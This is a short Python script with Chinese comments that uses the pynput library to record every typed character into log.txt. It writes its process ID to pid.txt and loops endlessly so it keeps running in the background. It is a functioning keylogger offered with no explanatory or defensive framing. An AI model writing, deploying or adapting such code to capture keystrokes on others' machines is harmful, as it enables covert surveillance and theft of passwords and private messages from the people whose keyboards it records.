from pynput import keyboard
import os

# 定义记录器函数


def on_press(key):
    try:
        # 将按键转换为字符串并追加到文本文件中
        with open('log.txt', 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        # 忽略特殊按键
        pass


# 创建监听器对象
listener = keyboard.Listener(on_press=on_press)

# 启动监听器对象
listener.start()

# 让脚本在后台运行
try:
    # 创建空的PID文件
    pid_file = open('pid.txt', 'w')
    pid_file.write(str(os.getpid()))
    pid_file.close()

    # 进入无限循环以保持脚本运行
    while True:
        pass

except KeyboardInterrupt:
    # 捕获键盘中断信号，停止监听器
    listener.stop()
